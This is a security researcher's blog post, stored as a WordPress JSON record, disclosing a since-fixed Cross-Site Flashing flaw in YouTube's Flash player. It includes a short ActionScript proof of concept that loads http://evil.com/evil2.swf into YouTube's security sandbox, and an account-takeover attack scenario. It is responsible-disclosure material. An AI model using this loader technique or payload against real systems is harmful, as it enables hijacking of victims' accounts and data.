{"id":53,"date":"2017-08-30T11:21:40","date_gmt":"2017-08-30T11:21:40","guid":{"rendered":"https:\/\/opnsec.com\/?p=53"},"modified":"2021-07-30T20:07:09","modified_gmt":"2021-07-30T20:07:09","slug":"advanced-flash-vulnerabilities-in-youtube-part-2","status":"publish","type":"post","link":"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube-part-2\/","title":{"rendered":"Advanced Flash Vulnerabilities in Youtube &#8211; Part 2"},"content":{"rendered":"<h3>II. XSF via appLoader<\/h3>\n<p><img loading=\"lazy\" class=\"alignnone size-medium wp-image-149\" style=\"display: none;\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-300x116.png\" alt=\"\" width=\"1\" height=\"1\" srcset=\"https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-300x116.png 300w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-150x150.png 150w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-768x296.png 768w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-1024x395.png 1024w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC-640x360.png 640w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Youtube-POC.png 1190w\" sizes=\"(max-width: 1px) 100vw, 1px\" \/>In <a href=\"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube\/\"><strong>Part 1<\/strong><\/a>, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com.<br \/>\nThis type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing (XSF) or Same-Origin Policy Bypass using Flash.<\/p>\n<p>It will get a little bit more complex, you can read more about Flash security model <a href=\"http:\/\/www.senocular.com\/flash\/tutorials\/contentdomains\/\" target=\"_blank\" rel=\"noopener noreferrer\">here<\/a>.<\/p>\n<p>Let&#8217;s have a look at the Youtube Flash Api, this time showing the security sandboxes.<\/p>\n<p><img loading=\"lazy\" class=\"wp-image-54 aligncenter\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Diagramme6.svg\" alt=\"\" width=\"905\" height=\"241\" \/><\/p>\n<p>A <a href=\"http:\/\/help.adobe.com\/en_US\/FlashPlatform\/reference\/actionscript\/3\/flash\/display\/Loader.html\" target=\"_blank\" rel=\"noopener noreferrer\">Loader <\/a>object can load an external Flash file in 2 ways :<\/p>\n<p>(1) In the normal way, the 2 Flash files are in separate Security Sandboxes (like with &lt;iframe&gt; in html)<\/p>\n<p>(2) If the loader uses the argument &#8220;<a href=\"http:\/\/help.adobe.com\/en_US\/FlashPlatform\/reference\/actionscript\/3\/flash\/system\/SecurityDomain.html\" target=\"_blank\" rel=\"noopener noreferrer\">SecurityDomain.currentDomain<\/a>&#8220;, the <strong>loaded Flash file will execute in the loader security sandbox <\/strong>(similar to &lt;script src=&#8221;&#8221;&gt; in html, which is very different than loading an &lt;iframe&gt;!). This is how the Main App loads the Modules.<br \/>\nNote: don&#8217;t be fooled by the fact that the Main App and Modules files are both located in the same domain s.ytimg.com, this is not the reason why they are in the same security sandbox here, but because the Main App uses the argument &#8220;<a href=\"http:\/\/help.adobe.com\/en_US\/FlashPlatform\/reference\/actionscript\/3\/flash\/system\/SecurityDomain.html\" target=\"_blank\" rel=\"noopener noreferrer\">SecurityDomain.currentDomain<\/a>&#8221; to load Modules.<\/p>\n<p>We already saw in Part 1 a technique to access the Youtube appLoader property using youtubeWrapper.getChildAt(0). This time we will use appLoader to load another external file into Youtube security sandbox using appLoader.load(&#8220;evil.com\/evil2.swf&#8221;, SecurityDomain.currentDomain).<\/p>\n<p>&nbsp;<\/p>\n<p>Here is the POC workflow<\/p>\n<p><a href=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Diagramme3.svg\"><img loading=\"lazy\" class=\"wp-image-59 aligncenter\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/Diagramme3.svg\" alt=\"\" width=\"905\" height=\"335\" \/><\/a><\/p>\n<p>And the POC code:<\/p>\n<pre><code >var loader = new Loader();<br \/>\n\/\/ Load the Youtube Wrapper (1)<br \/>\nloader.load(new URLRequest(\"https:\/\/www.youtube.com\/v\/[VIDEO_ID]\"));<br \/>\nvar youtubeWrapper = loader.content;<br \/>\n\/\/ Access the Youtube Wrapper appLoader object (3)<br \/>\nvar appLoader = youtubeWrapper.getChildAt(0);<br \/>\n\/\/ Load evil2.swf in youtubeWrapper security sandbox. (4)<br \/>\nappLoader.load(new URLRequest(\"http:\/\/evil.com\/evil2.swf\"), new LoaderContext(false, ApplicationDomain.currentDomain, SecurityDomain.currentDomain));<br \/>\n\/\/ evil2.swf can execute arbitrary code in youtube.com security sandbox (5)<\/code><\/pre>\n<p>&nbsp;<\/p>\n<p>Technical details:<br \/>\nSecurityDomain.currentDomain is a relative value, since it&#8217;s apply to the <strong>current<\/strong> Security Sandbox. Flash documentation states that it is the security sandbox of the file where the instruction is written. Nice and easy, however, it is proven to be more complex here.<\/p>\n<p>appLoader is instantiated in Youtube Wrapper, but the call to appLoader.load(evil.com\/evil2.swf, SecurityDomain.currentDomain ) is written in evil.swf. So evil2.swf should normally load in evil.swf security sandbox. If you debug the Flash execution, this is what is happening first (when looking for crossdomain.xml file). But at the last moment, because appLoader was instantiated in Youtube Wrapper, evil2.swf will actually execute in Youtube security sandbox.<\/p>\n<p>Once evil.com\/evil2.swf is loaded in Youtube security sandbox, the Flash Player will treat it like if it was located at https:\/\/www.youtube.com\/v\/xxx\/[[IMPORT]]\/http:\/\/evil.com\/evil2.swf.<br \/>\nThis means that evil2.swf can send request to any https:\/\/www.youtube.com\/ URL and read response source code using <a href=\"http:\/\/help.adobe.com\/en_US\/FlashPlatform\/reference\/actionscript\/3\/flash\/net\/URLLoader.html\" target=\"_blank\" rel=\"noopener noreferrer\">URLLoader<\/a>.<\/p>\n<blockquote><p>URLLoader is similar to <a href=\"https:\/\/developer.mozilla.org\/en\/docs\/Web\/API\/XMLHttpRequest\" target=\"_blank\" rel=\"noopener noreferrer\">XHR <\/a>in javascript.<\/p><\/blockquote>\n<p>Impact:<br \/>\nUsing this vulnerability, an attacker could access any private data on the victim&#8217;s Youtube account. It could access private videos, post comments on behalf of the victim or delete all the victim&#8217;s videos. The impact is similar to a reflective XSS on youtube.com.<\/p>\n<p>Attack scenario:<br \/>\nPrerequisite : The victim is logged in Youtube and have Flash active<br \/>\n1 The victim visits http:\/\/evil.com\/evil.html<br \/>\n2 The attacker has control over the victim&#8217;s Youtube account<\/p>\n<p>Timeline:<br \/>\n05\/20\/2016 \u2013 reported to Google VRP<br \/>\n05\/20\/2016 \u2013 \u201cNice catch\u201d from Google<br \/>\n05\/24\/2016 \u2013 reward<img loading=\"lazy\" class=\"alignnone size-full wp-image-70\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/2-stars.png\" alt=\"\" width=\"60\" height=\"14\" \/><br \/>\n06\/07\/2016 \u2013 Issue fixed and verified<br \/>\n&nbsp;<br \/>\nConclusion:<br \/>\nSecurity Sandbox is a great tool but it is complex and implemented deep inside the core language, making it difficult for developers to predict the exact behavior for edge cases (in particular if the language is not open source). Always be careful when using it.<br \/>\n&nbsp;<br \/>\nIn <a href=\"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube-part-3\/\"><strong>Part 3<\/strong><\/a>, I will disclose another XSF and show how Flash vulnerability can be even more dangerous than XSS in some cases.<br \/>\n&nbsp;<\/p>\n\n<div class=\"twitter-share\"><a href=\"https:\/\/twitter.com\/intent\/tweet?via=opnsec\" class=\"twitter-share-button\">Tweet<\/a><\/div>\n","protected":false},"excerpt":{"rendered":"<p>II. XSF via appLoader In Part 1, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com. This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing&hellip; <a class=\"read-more\" href=\"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube-part-2\/\">Read More<\/a><\/p>\n","protected":false},"author":2,"featured_media":0,"comment_status":"closed","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"spay_email":""},"categories":[2],"tags":[3,5,4],"jetpack_featured_media_url":"","_links":{"self":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/53"}],"collection":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/users\/2"}],"replies":[{"embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/comments?post=53"}],"version-history":[{"count":28,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/53\/revisions"}],"predecessor-version":[{"id":373,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/53\/revisions\/373"}],"wp:attachment":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/media?parent=53"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/categories?post=53"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/tags?post=53"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}